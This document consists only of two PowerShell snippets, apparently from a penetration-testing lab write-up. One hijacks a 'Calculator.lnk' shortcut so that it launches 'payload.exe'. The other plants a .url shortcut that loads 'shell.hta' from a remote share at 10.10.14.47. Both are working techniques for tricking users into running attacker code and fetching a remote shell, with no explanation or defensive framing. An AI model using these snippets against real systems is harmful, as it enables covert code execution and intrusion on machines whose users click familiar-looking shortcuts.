
```powershell
$objShell = New-Object -ComObject Wscript.Shell
$lnk = $objShell.CreateShortcut("c:\Common Applications\Calculator.lnk")
$lnk.TargetPath = "c:\xampp\htdocs\files\payload.exe"
$lnk.Save()
```

```powershell
$url = "file://10.10.14.47/share/shell.hta"
$shortcutPath = "C:\inetpub\testing\shell.url"
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
Set-Content -Path $shortcutPath -Value $shortcutContent
```


